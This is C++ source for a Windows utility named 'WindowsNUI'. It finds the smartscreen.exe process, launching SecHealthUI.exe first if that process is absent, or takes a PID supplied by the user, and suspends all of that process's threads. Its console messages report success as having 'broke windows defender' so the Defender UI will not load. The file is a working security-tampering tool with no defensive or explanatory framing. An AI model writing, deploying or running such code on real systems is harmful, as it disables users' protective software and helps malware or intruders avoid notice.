#include <iostream>
#include <Windows.h>
#include <string>
#include <TlHelp32.h>
#include <thread>
#include <chrono>

BOOL SuspendAll(DWORD PID)
{
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE)
	{
		std::cout << "[-] Failed to create snapshot." << std::endl;
		return false;
	}
	THREADENTRY32 te{};
	te.dwSize = sizeof(te);
	std::cout << "[+] Created snapshot" << std::endl;
	if (!Thread32First(hSnapshot, &te))
	{
		CloseHandle(hSnapshot);
		std::cout << "[-] No Entry." << std::endl;
		return false;
	}
	do
	{
		if (te.th32OwnerProcessID == PID)
		{
			HANDLE hThread = OpenThread(
				THREAD_SUSPEND_RESUME,
				FALSE,
				te.th32ThreadID);
			if (hThread)
			{
				SuspendThread(hThread);
				CloseHandle(hThread);
			}
		}
	} while (Thread32Next(hSnapshot, &te));
	CloseHandle(hSnapshot);
	std::cout << "[+] Main activity success!" << std::endl;
	return true;
}

DWORD SearchProc(std::wstring Proc)
{
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE)
	{
		std::cout << "[-] Failed to snapshot all processes" << std::endl;
		CloseHandle(hSnapshot);
		return 0;
	}
	PROCESSENTRY32W pe{};
	pe.dwSize = sizeof(pe);
	if (!Process32FirstW(hSnapshot, &pe))
	{
		std::cout << "[-] Failed to create proc snapshot" << std::endl;
		CloseHandle(hSnapshot);
		return 3;
	}
	do
	{
		if (std::wstring(pe.szExeFile) == Proc)
		{
			CloseHandle(hSnapshot);
			return pe.th32ProcessID;
		}
	} while (Process32NextW(hSnapshot, &pe));
	CloseHandle(hSnapshot);
	return 0;
}

bool SelfC()
{
	DWORD pid;
	pid = SearchProc(L"smartscreen.exe");
	if (pid == 3)
	{
		std::cout << "[-] Failed to search the process needed." << std::endl;
		return false;
	}
	else if (pid == 0)
	{
		std::cout << "[*] Needed Windows defender process isn't running... Creating!" << std::endl;
		std::string SecHealthUI= "C:\\Program Files\\WindowsApps\\Microsoft.SecHealthUI_1000.29628.1000.0_x64__8wekyb3d8bbwe\\SecHealthUI.exe";
		PROCESS_INFORMATION pi{};
		STARTUPINFOA si = { sizeof(si) };
		if (!CreateProcessA(
			NULL,
			SecHealthUI.data(),
			NULL,
			NULL,
			FALSE,
			0,
			NULL,
			NULL,
			&si,
			&pi
		))
		{
			std::cout << "[-] Failed to start SecHealthUI.exe" << std::endl;
			return false;
		}
		std::this_thread::sleep_for(std::chrono::seconds(2));
		std::cout << "[+] Started SecHealthUI.exe." << std::endl;
		return SelfC();
	}
	else
	{
		std::cout << "PID found: " << pid << std::endl;
		if (!SuspendAll(pid))
		{
			return false;
		}
		return true;
	}
}

int main(int argc, char* argv[])
{
	if (argc < 2)
	{
		std::cout << "[-] Not enough arguments. Usage: WindowsNUI.exe <pid>" << std::endl;
		return 1;
	}
	char* PIDC = argv[1];
	std::string PIDS = PIDC;
	if (PIDS == "selfc")
	{
		if (!SelfC())
		{
			std::cout << "[-] Failed to break windows defender." << std::endl;
			return 1;
		}
		std::cout << "[+] Successfully broke windows defender UI" << std::endl;
	}
	else
	{
		int PID = std::stoi(PIDS);

		std::cout << "[*] Starting operation..." << std::endl;
		if (!SuspendAll(DWORD(PID)))
		{
			std::cout << "[-] WindowsNUI failed." << std::endl;
			return 1;
		}
		std::cout << "[+] WindowsNUI success! Windows defender UI will not load." << std::endl;
		
	}
	return 0;
}